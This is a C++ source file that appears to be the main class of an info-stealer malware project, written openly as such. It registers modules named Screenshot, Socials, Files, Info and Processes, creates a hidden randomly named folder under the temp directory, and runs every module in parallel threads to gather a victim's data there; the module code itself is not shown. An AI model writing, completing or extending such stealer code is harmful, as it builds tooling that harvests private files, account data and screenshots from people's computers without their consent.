//
// Created by .1qxz on 06.06.2024.
//

#include "Stealer.h"
#include "impl/Screenshot.h"
#include "impl/Info.h"
#include "impl/socials/Socials.h"
#include "impl/files/Files.h"
#include "impl/Processes.h"
#include <thread>

void Stealer::registerModules() {
    this->modules.push_back(new Screenshot());
    this->modules.push_back(new Socials());
    this->modules.push_back(new Files());
    this->modules.push_back(new Info());
    this->modules.push_back(new Processes());
}


Stealer::Stealer() {
    this->registerModules();

    this->root_dir = Utils::getTemp() / Utils::generateString(10);
    fs::create_directory(this->root_dir);

#if DEV
    std::string cmd = "explorer.exe " + this->root_dir.string();
    std::system(cmd.c_str());
#endif
}

void Stealer::run() {
    std::vector<std::thread> threads;

    for(StealerModule* module : this->modules) {
        threads.emplace_back([module, this]() {
            module->execute(this->root_dir);
        });
    }

    for(auto& thread : threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }
}

void Stealer::complete() {
    std::cout << "l";
}
